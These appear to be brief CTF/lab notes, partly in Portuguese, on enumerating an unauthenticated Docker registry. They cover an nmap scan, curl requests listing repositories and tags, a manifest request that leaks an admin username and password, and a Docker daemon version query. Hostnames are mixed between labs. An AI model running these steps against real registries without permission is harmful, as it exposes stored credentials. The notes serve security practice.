
## Interacting with a Docker Registry

#### 1º Passo ver Portas da API e Vesão

```
sudo nmap -sV 10.10.191.47

```

#### 2º Passo Get  repositórios 
```

curl http://jwtdecoder.sstf.site:3000/v2/_catalog -H "Accept: application/json"

```

output:
```jason

{"repositories":["cmnatic/myapp1","dive/challenge","dive/example"]}

```

#### 3º Passo Get Tags
```
curl http://docker-rodeo.thm:7000/v2/securesolutions/webserver/tags/list -H "Accept: application/json"

```

output:
```
{"name":"securesolutions/webserver","tags":["production"]}

```

#### 4º Passo Get Username and Password
```
 curl http://docker-rodeo.thm:7000/v2/securesolutions/webserver/manifests/production -H "Accept: application/json"

```


output:
```
***
\\\"Username: admin\\\\nPassword: production_admin\\\\n\\\
***
```

#### Version
```
curl http://10.10.61.26:2375/version

```